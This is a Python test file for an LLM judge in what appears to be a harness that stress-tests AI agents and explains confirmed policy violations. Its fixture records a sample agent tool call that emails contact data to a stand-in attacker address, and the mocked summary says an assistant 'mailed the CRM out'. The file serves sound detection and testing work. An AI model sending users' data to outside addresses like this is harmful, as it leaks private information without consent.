"""The judge explains a confirmed incident; it never changes the verdict."""

import json

from contracts.models import Effect
from engine.detection import decision_model, judge

BAD = [Effect(detonation_id="det_001_01", run_index=1, step=3, tool="send_email",
              args={"to": "attacker@evil-corp-demo.com", "body": "8 contacts"}, violates=["P1", "P5"])]


def answer(monkeypatch, reply):
    seen = {}

    def converse(**kwargs):
        seen.update(kwargs)
        if isinstance(reply, Exception):
            raise reply
        return {"output": {"message": {"content": [{"text": json.dumps(reply)}]}}}
    monkeypatch.setattr(decision_model, "_converse", converse)
    monkeypatch.setenv("MIRAGE_JUDGE", "1")
    return seen


def test_the_judge_reads_only_the_effects_and_adds_valid_policies(monkeypatch):
    seen = answer(monkeypatch, {"policies": ["P4", "P6", "P9", "ignore"], "summary": "It mailed the CRM out."})
    said = judge.judge("meeting_assistant", "Prep my meetings", BAD)
    assert said == {"policies": ["P4", "P6"], "summary": "It mailed the CRM out."}
    prompt = seen["messages"][0]["content"][0]["text"]
    assert "attacker@evil-corp-demo.com" in prompt and "<effects>" in prompt


def test_no_judge_when_off_clean_or_failing(monkeypatch):
    answer(monkeypatch, RuntimeError("expired token"))
    assert judge.judge("a", "t", BAD) is None
    assert judge.judge("a", "t", []) is None
    answer(monkeypatch, {"policies": ["P1"], "summary": ""})
    assert judge.judge("a", "t", BAD) is None
    monkeypatch.setenv("MIRAGE_JUDGE", "0")
    assert judge.judge("a", "t", BAD) is None
